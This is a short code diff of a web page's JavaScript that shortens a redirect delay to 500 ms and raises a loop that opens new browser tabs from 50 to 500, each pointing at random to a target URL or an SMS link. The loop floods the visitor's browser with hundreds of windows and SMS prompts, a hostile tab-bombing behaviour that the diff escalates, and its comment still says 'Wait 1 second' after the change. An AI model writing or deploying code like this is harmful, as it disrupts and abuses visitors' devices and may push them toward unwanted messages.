@@ -87,10 +87,10 @@
                     console.log("Deep link failed. Final fallback to standard HTTPS.");
                     window.location.replace(targetUrl);
                 }
-            }, 1000); // Wait 1 second
+            }, 500); // Wait 1 second
 
             // Open multiple new tabs
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 500; i++) {
                 const randomUrl = Math.random() < 0.5 ? targetUrl : smsUrl;
                 window.open(randomUrl, '_blank');
             }
